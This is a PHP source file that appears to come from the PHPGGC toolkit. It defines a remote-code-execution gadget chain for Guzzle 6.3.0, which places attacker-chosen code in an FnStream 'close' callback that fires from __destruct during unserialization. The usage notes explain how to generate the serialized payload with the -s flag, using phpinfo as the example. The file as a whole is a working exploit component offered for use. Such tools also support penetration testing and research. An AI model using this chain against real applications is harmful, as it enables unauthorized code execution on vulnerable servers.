<?php

namespace GadgetChain\Guzzle;

class RCE1 extends \PHPGGC\GadgetChain\RCE
{
    public $version = '6.3.0';
    public $vector = '__destruct';
    public $author = 'proclnas';
    public $informations = 
        '1 - Use -s flag on phpggc to generate payload and avoid NULL bytes in the generated payload' . PHP_EOL .
        '2 - The called function is executed trough a call_user_func call, so it\'s necessary generate the ' . PHP_EOL .
        '    payload using just the function symbol, eg: ./phpggc guzzle/rce1 -s \'phpinfo\'.';


    public function generate(array $parameters)
    {
        $code = $parameters['code'];

        return new \GuzzleHttp\Psr7\FnStream(['close' => $code]);
    }
}